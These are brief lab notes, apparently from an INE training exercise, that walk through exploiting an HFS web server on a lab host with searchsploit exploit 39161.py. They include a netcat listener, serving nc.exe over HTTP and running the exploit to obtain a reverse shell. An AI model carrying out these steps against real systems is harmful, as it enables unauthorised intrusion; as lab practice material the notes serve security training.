#### Fixing searchsploit
- nmap -sV -sS demo.ine.local [ confirm the service is running ]
- searchsploit hfs
- searchsploit -m 39161.py [this will show the complete path of exploit code ]
- cp /path/39161.py . [ this will copy the exploit into current directory ]
- nano 39161.py [ edit local ip and port ]
- cp /usr/share/windows-binaries/nc.exe . [ copied the nc.exe file into current directory ]
- nc -lvnp 9001 [ set the port same as python file local port ]
- python -m SimpleHTTPServer 80 [run the python server]
- python 39161.py demo.ine.local 80 [run this multiple time  ]
